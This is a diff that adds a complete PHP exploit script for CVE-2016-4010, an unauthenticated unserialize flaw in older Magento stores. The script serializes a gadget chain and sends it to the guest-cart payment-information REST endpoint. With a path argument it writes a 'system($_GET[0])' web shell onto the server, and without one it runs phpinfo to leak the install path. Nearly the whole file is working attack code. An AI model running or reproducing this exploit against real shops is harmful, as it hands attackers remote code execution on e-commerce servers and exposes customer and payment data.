@@ -1,0 +1,544 @@
+<?php
+
+// Exploit Title: [CVE-2016-4010] Magento unauthenticated arbitrary unserialize -> arbitrary write file
+// Date: 18/05/206
+// Exploit Author: agix (discovered by NETANEL RUBIN)
+// Vendor Homepage: https://magento.com
+// Version: < 2.0.6
+// CVE : CVE-2016-4010
+
+// to get a valid guestCartId
+// * add an item in your cart
+// * go to checkout
+// * fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information
+// (* in the response check the payment method it may vary from checkmo)
+//
+// If you didn\'t provide whereToWrite, it will execute phpinfo to leak path.
+
+
+class Magento_Framework_Simplexml_Config_Cache_File extends DataObject
+{
+    function __construct($data){
+        $this->_data = $data;
+    }
+}
+
+class Credis_Client{
+    const TYPE_STRING      = 'string';
+    const TYPE_LIST        = 'list';
+    const TYPE_SET         = 'set';
+    const TYPE_ZSET        = 'zset';
+    const TYPE_HASH        = 'hash';
+    const TYPE_NONE        = 'none';
+    const FREAD_BLOCK_SIZE = 8192;
+
+    /**
+     * Socket connection to the Redis server or Redis library instance
+     * @var resource|Redis
+     */
+    protected $redis;
+    protected $redisMulti;
+
+    /**
+     * Host of the Redis server
+     * @var string
+     */
+    protected $host;
+
+    /**
+     * Port on which the Redis server is running
+     * @var integer
+     */
+    protected $port;
+
+    /**
+     * Timeout for connecting to Redis server
+     * @var float
+     */
+    protected $timeout;
+
+    /**
+     * Timeout for reading response from Redis server
+     * @var float
+     */
+    protected $readTimeout;
+
+    /**
+     * Unique identifier for persistent connections
+     * @var string
+     */
+    protected $persistent;
+
+    /**
+     * @var bool
+     */
+    protected $closeOnDestruct = TRUE;
+
+    /**
+     * @var bool
+     */
+    protected $connected = TRUE;
+
+    /**
+     * @var bool
+     */
+    protected $standalone;
+
+    /**
+     * @var int
+     */
+    protected $maxConnectRetries = 0;
+
+    /**
+     * @var int
+     */
+    protected $connectFailures = 0;
+
+    /**
+     * @var bool
+     */
+    protected $usePipeline = FALSE;
+
+    /**
+     * @var array
+     */
+    protected $commandNames;
+
+    /**
+     * @var string
+     */
+    protected $commands;
+
+    /**
+     * @var bool
+     */
+    protected $isMulti = FALSE;
+
+    /**
+     * @var bool
+     */
+    protected $isWatching = FALSE;
+
+    /**
+     * @var string
+     */
+    protected $authPassword;
+
+    /**
+     * @var int
+     */
+    protected $selectedDb = 0;
+
+    /**
+     * Aliases for backwards compatibility with phpredis
+     * @var array
+     */
+    protected $wrapperMethods = array('delete' => 'del', 'getkeys' => 'keys', 'sremove' => 'srem');
+
+    /**
+     * @var array
+     */
+    protected $renamedCommands;
+
+    /**
+     * @var int
+     */
+    protected $requests = 0;
+
+
+    public function __construct($resource) {
+        $this->redis = new Magento_Sales_Model_Order_Payment_Transaction($resource);
+    }
+}
+
+class DataObject
+{
+    /**
+     * Object attributes
+     *
+     * @var array
+     */
+    protected $_data = [];
+
+    /**
+     * Setter/Getter underscore transformation cache
+     *
+     * @var array
+     */
+    protected static $_underscoreCache = [];
+}
+
+abstract class AbstractModel2 extends DataObject
+{
+    /**
+     * Prefix of model events names
+     *
+     * @var string
+     */
+    protected $_eventPrefix = 'core_abstract';
+
+    /**
+     * Parameter name in event
+     *
+     * In observe method you can use $observer->getEvent()->getObject() in this case
+     *
+     * @var string
+     */
+    protected $_eventObject = 'object';
+
+    /**
+     * Name of object id field
+     *
+     * @var string
+     */
+    protected $_idFieldName = 'id';
+
+    /**
+     * Data changes flag (true after setData|unsetData call)
+     * @var $_hasDataChange bool
+     */
+    protected $_hasDataChanges = false;
+
+    /**
+     * Original data that was loaded
+     *
+     * @var array
+     */
+    protected $_origData;
+
+    /**
+     * Object delete flag
+     *
+     * @var bool
+     */
+    protected $_isDeleted = false;
+
+    /**
+     * Resource model instance
+     *
+     * @var \Magento\Framework\Model\ResourceModel\Db\AbstractDb
+     */
+    protected $_resource;
+
+    /**
+     * Resource collection
+     *
+     * @var \Magento\Framework\Model\ResourceModel\Db\Collection\AbstractCollection
+     */
+    protected $_resourceCollection;
+
+    /**
+     * Name of the resource model
+     *
+     * @var string
+     */
+    protected $_resourceName;
+
+    /**
+     * Name of the resource collection model
+     *
+     * @var string
+     */
+    protected $_collectionName;
+
+    /**
+     * Model cache tag for clear cache in after save and after delete
+     *
+     * When you use true - all cache will be clean
+     *
+     * @var string|array|bool
+     */
+    protected $_cacheTag = false;
+
+    /**
+     * Flag which can stop data saving after before save
+     * Can be used for next sequence: we check data in _beforeSave, if data are
+     * not valid - we can set this flag to false value and save process will be stopped
+     *
+     * @var bool
+     */
+    protected $_dataSaveAllowed = true;
+
+    /**
+     * Flag which allow detect object state: is it new object (without id) or existing one (with id)
+     *
+     * @var bool
+     */
+    protected $_isObjectNew = null;
+
+    /**
+     * Validator for checking the model state before saving it
+     *
+     * @var \Zend_Validate_Interface|bool|null
+     */
+    protected $_validatorBeforeSave = null;
+
+    /**
+     * Application Event Dispatcher
+     *
+     * @var \Magento\Framework\Event\ManagerInterface
+     */
+    protected $_eventManager;
+
+    /**
+     * Application Cache Manager
+     *
+     * @var \Magento\Framework\App\CacheInterface
+     */
+    protected $_cacheManager;
+
+    /**
+     * @var \Magento\Framework\Registry
+     */
+    protected $_registry;
+
+    /**
+     * @var \Psr\Log\LoggerInterface
+     */
+    protected $_logger;
+
+    /**
+     * @var \Magento\Framework\App\State
+     */
+    protected $_appState;
+
+    /**
+     * @var \Magento\Framework\Model\ActionValidator\RemoveAction
+     */
+    protected $_actionValidator;
+
+    /**
+     * Array to store object's original data
+     *
+     * @var array
+     */
+    protected $storedData = [];
+}
+
+abstract class AbstractExtensibleModel extends AbstractModel2
+{
+    protected $extensionAttributesFactory;
+
+    /**
+     * @var \Magento\Framework\Api\ExtensionAttributesInterface
+     */
+    protected $extensionAttributes;
+
+    /**
+     * @var AttributeValueFactory
+     */
+    protected $customAttributeFactory;
+
+    /**
+     * @var string[]
+     */
+    protected $customAttributesCodes = null;
+
+    /**
+     * @var bool
+     */
+    protected $customAttributesChanged = false;
+
+}
+
+abstract class AbstractModel extends AbstractExtensibleModel
+{
+}
+
+class Magento_Sales_Model_Order_Payment_Transaction extends AbstractModel
+{
+    /**#@+
+     * Supported transaction types
+     * @var string
+     */
+    const TYPE_PAYMENT = 'payment';
+
+    const TYPE_ORDER = 'order';
+
+    const TYPE_AUTH = 'authorization';
+
+    const TYPE_CAPTURE = 'capture';
+
+    const TYPE_VOID = 'void';
+
+    const TYPE_REFUND = 'refund';
+
+    /**#@-*/
+
+    /**
+     * Raw details key in additional info
+     */
+    const RAW_DETAILS = 'raw_details_info';
+
+    /**
+     * Order instance
+     *
+     * @var \Magento\Sales\Model\Order\Payment
+     */
+    protected $_order = null;
+
+    /**
+     * Parent transaction instance
+     * @var \Magento\Sales\Model\Order\Payment\Transaction
+     */
+    protected $_parentTransaction = null;
+
+    /**
+     * Child transactions, assoc array of transaction_id => instance
+     *
+     * @var array
+     */
+    protected $_children = null;
+
+    /**
+     * Child transactions, assoc array of txn_id => instance
+     * Filled only in case when all child transactions have txn_id
+     * Used for quicker search of child transactions using isset() as opposite to foreaching $_children
+     *
+     * @var array
+     */
+    protected $_identifiedChildren = null;
+
+    /**
+     * Whether to perform automatic actions on transactions, such as auto-closing and putting as a parent
+     *
+     * @var bool
+     */
+    protected $_transactionsAutoLinking = true;
+
+    /**
+     * Whether to throw exceptions on different operations
+     *
+     * @var bool
+     */
+    protected $_isFailsafe = true;
+
+    /**
+     * Whether transaction has children
+     *
+     * @var bool
+     */
+    protected $_hasChild = null;
+
+    /**
+     * Event object prefix
+     *
+     * @var string
+     * @see \Magento\Framework\Model\AbstractModel::$_eventPrefix
+     */
+    protected $_eventPrefix = 'sales_order_payment_transaction';
+
+    /**
+     * Event object prefix
+     *
+     * @var string
+     * @see \Magento\Framework\Model\AbstractModel::$_eventObject
+     */
+    protected $_eventObject = 'order_payment_transaction';
+
+    /**
+     * Order website id
+     *
+     * @var int
+     */
+    protected $_orderWebsiteId = null;
+
+    /**
+     * @var \Magento\Sales\Model\OrderFactory
+     */
+    protected $_orderFactory;
+
+    /**
+     * @var \Magento\Framework\Stdlib\DateTime\DateTimeFactory
+     */
+    protected $_dateFactory;
+
+    /**
+     * @var TransactionFactory
+     */
+    protected $_transactionFactory;
+
+    /**
+     * @var \Magento\Sales\Api\OrderPaymentRepositoryInterface
+     */
+    protected $orderPaymentRepository;
+
+    /**
+     * @var \Magento\Sales\Api\OrderRepositoryInterface
+     */
+    protected $orderRepository;
+
+    /**
+     * @param \Magento\Framework\Model\Context $context
+     * @param \Magento\Framework\Registry $registry
+     * @param \Magento\Framework\Api\ExtensionAttributesFactory $extensionFactory
+     * @param AttributeValueFactory $customAttributeFactory
+     * @param \Magento\Sales\Model\OrderFactory $orderFactory
+     * @param \Magento\Framework\Stdlib\DateTime\DateTimeFactory $dateFactory
+     * @param TransactionFactory $transactionFactory
+     * @param \Magento\Framework\Model\ResourceModel\AbstractResource $resource
+     * @param \Magento\Framework\Data\Collection\AbstractDb $resourceCollection
+     * @param array $data
+     * @SuppressWarnings(PHPMD.ExcessiveParameterList)
+     */
+    public function __construct($resource) {
+        $this->_resource = $resource;
+    }
+}
+
+class Magento_Framework_DB_Transaction{
+    protected $_objects = [];
+
+    /**
+     * Transaction objects array with alias key
+     *
+     * @var array
+     */
+    protected $_objectsByAlias = [];
+
+    /**
+     * Callbacks array.
+     *
+     * @var array
+     */
+    protected $_beforeCommitCallbacks = ["phpinfo"];
+}
+
+if(count($argv) < 3){
+    echo 'Usage: '.$argv[0].' <magento_uri> <guestCartId> (whereToWrite)'.chr(0x0a);
+    echo 'To get a valid guestCartId'.chr(0x0a);
+    echo '* add an item in your cart'.chr(0x0a);
+    echo '* go to checkout'.chr(0x0a);
+    echo '* fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information'.chr(0x0a);
+    echo '(* in the response check the payment method it may vary from "checkmo")'.chr(0x0a).chr(0x0a);
+    echo 'If you didn\'t provide whereToWrite, it will execute phpinfo to leak path.'.chr(0x0a);
+    exit();
+}
+
+if(count($argv) === 4){
+    $data = [];
+    $data['is_allowed_to_save'] = True;
+    $data['stat_file_name'] = $argv[3];
+    $data['components'] = '<?php system($_GET[0]); ?>';
+    $resource = new Magento_Framework_Simplexml_Config_Cache_File($data);
+}
+else{
+    $resource = new Magento_Framework_DB_Transaction();
+}
+
+$redis = new Credis_Client($resource);
+$serialized = serialize($redis);
+
+$payload = json_decode('{"paymentMethod":{"method":"checkmo", "additional_data":{"additional_information":""}}, "email": "valid@magento.com"}');
+
+$payload->paymentMethod->additional_data->additional_information = str_replace('Magento_Framework_DB_Transaction', 'Magento\\Framework\\DB\\Transaction', str_replace('Magento_Sales_Model_Order_Payment_Transaction', 'Magento\\Sales\\Model\\Order\\Payment\\Transaction', str_replace('Magento_Framework_Simplexml_Config_Cache_File', 'Magento\\Framework\\Simplexml\\Config\\Cache\\File', $serialized)));
+
+for($i=0; $i<2; $i++){
+    $c = curl_init($argv[1].'/rest/V1/guest-carts/'.$argv[2].'/set-payment-information');
+    curl_setopt($c, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+    curl_setopt($c, CURLOPT_POSTFIELDS, json_encode($payload));
+    curl_exec($c);
+    curl_close($c);
+}
+
+?>
